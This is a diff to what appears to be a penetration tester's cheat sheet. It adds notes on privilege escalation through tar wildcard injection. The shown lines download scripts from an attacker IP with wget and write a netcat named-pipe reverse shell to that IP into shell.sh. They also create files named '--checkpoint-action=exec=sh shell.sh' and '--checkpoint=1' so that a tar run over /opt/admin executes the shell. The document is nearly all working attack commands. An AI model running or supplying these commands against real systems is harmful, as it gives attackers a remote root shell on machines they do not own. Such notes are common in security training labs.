@@ -315,6 +315,12 @@ ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
 wget http://192.168.45.234/sudo.sh -O sudo.sh
 wget http://192.168.45.234/pspy64 -O pspy
 
-#
+# exploit wildcards
+# https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c
+# https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+# from /opt/admin
 echo "mkfifo /tmp/lhennp; nc 192.168.45.234 9999 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"  
+echo "" > --checkpoint=1
+
 ```
